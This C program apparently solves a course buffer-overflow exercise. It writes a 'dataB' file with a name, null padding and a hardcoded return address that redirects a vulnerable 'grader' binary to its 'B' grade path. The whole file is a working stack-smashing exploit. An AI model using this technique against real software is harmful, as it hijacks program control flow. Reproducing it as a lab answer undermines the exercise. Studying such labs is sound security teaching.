#include <stdio.h>
#include <stdlib.h>

/*
   produces a file called dataB containing:
   - the student name "AnishKKat" followed by a null byte.
   - sufficient padding to overflow the stack buffer.
   - an overwritten return address directing the grader program to
     the code path that yields a 'B' grade.
   
   this allows the grader to print 'B' instead of the usual grade.
*/

/*
   main function behavior:
   - accepts no command-line arguments.
   - reads nothing from stdin.
   - writes a crafted byte sequence into "dataB".
   - returns 0 on success or 1 if file operations fail.
*/

int main(void) {
    /* declare variables at the beginning of the block for c89 compliance */
    const char *studentName = "AnishKKat";
    unsigned int nameLength = 9;          /* length of "AnishKKat" */
    unsigned int bufferSize = 48;         /* total buffer size in bytes */
    unsigned int totalNameBytes = nameLength + 1; /* includes null terminator */
    unsigned int paddingLength = bufferSize - totalNameBytes;
    unsigned long returnAddress = 0x400890UL; /* address for 'B' grade path */
    FILE *filePtr;
    unsigned int i;

    /* open "dataB" in binary write mode */
    filePtr = fopen("dataB", "wb");
    if (filePtr == NULL) {
        fprintf(stderr, "error: cannot open dataB for writing.\n");
        return 1;
    }

    /* write the chosen name and a null terminator */
    fwrite(studentName, 1, nameLength, filePtr);
    fputc('\0', filePtr);

    /* write padding bytes (nulls) to overrun the stack buffer */
    for (i = 0; i < paddingLength; i++) {
        fputc('\0', filePtr);
    }

    /* overwrite the return address to cause a jump to the 'B' grade code path */
    fwrite(&returnAddress, sizeof(returnAddress), 1, filePtr);

    /* close the file cleanly */
    fclose(filePtr);

    return 0;
}